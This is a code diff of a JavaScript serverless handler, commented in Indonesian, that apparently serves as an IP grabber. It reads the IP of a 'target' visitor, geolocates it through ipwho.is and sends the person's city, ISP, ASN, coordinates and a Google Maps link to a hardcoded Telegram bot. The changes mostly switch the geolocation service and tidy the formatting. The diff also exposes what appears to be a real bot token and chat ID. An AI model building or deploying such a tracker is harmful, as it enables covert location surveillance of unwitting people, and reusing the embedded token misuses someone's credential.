@@ -1,29 +1,35 @@
 export default async function handler(req, res) {
-  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
+  if (req.method !== "POST") {
+    return res.status(405).json({ error: "Method not allowed" });
+  }
 
-  const BOT_TOKEN = "8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY";  // ganti
-  const CHAT_ID = "7600526426";      // ganti
+  const BOT_TOKEN = "8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY"; // ganti
+  const CHAT_ID = "7600526426";     // ganti
 
   try {
-    // Ambil IP target
+    // Ambil IP target dari request
     const ipHeader = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const ip = ipHeader.split(',')[0].trim();
 
-    // Fetch geolocation
-    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
-    const data = await geoRes.json();
+    console.log("IP target:", ip);
+
+    // Gunakan ipwho.is HTTPS agar stabil
+    const geoRes = await fetch(`https://ipwho.is/${ip}`);
+    const geoData = await geoRes.json();
+
+    console.log("Geo data:", geoData);
 
     const info = `
 📡 *IP Terdeteksi*
-🌐 IP: ${data.query}
-🌍 Negara: ${data.country}
-🏙 Kota: ${data.city}, ${data.regionName} ${data.zip}
-🛰 ISP: ${data.isp}
-🏢 Org: ${data.org}
-⚡ ASN: ${data.as}
-⌚ Zona Waktu: ${data.timezone}
-📌 Koordinat: ${data.lat},${data.lon}
-🔗 https://www.google.com/maps?q=${data.lat},${data.lon}
+🌐 IP: ${geoData.ip}
+🌍 Negara: ${geoData.country || "Unknown"}
+🏙 Kota: ${geoData.city || "Unknown"}, ${geoData.region || "Unknown"} ${geoData.postal || ""}
+🛰 ISP: ${geoData.connection?.isp || "Unknown"}
+🏢 Org: ${geoData.connection?.org || "Unknown"}
+⚡ ASN: ${geoData.connection?.asn || "Unknown"}
+⌚ Zona Waktu: ${geoData.timezone?.id || "Unknown"}
+📌 Koordinat: ${geoData.latitude || "Unknown"},${geoData.longitude || "Unknown"}
+🔗 https://www.google.com/maps?q=${geoData.latitude || ""},${geoData.longitude || ""}
     `;
 
     // Kirim ke Telegram
@@ -38,7 +44,7 @@ export default async function handler(req, res) {
     });
 
     const telegramResult = await telegramRes.json();
-    console.log("Telegram Result:", telegramResult);  // 🔥 Debug di log
+    console.log("Telegram result:", telegramResult);
 
     res.status(200).json({ status: "ok", telegramResult });
 
@@ -46,4 +52,4 @@ export default async function handler(req, res) {
     console.error("Error:", err);
     res.status(500).json({ error: err.message });
   }
-                }
+}
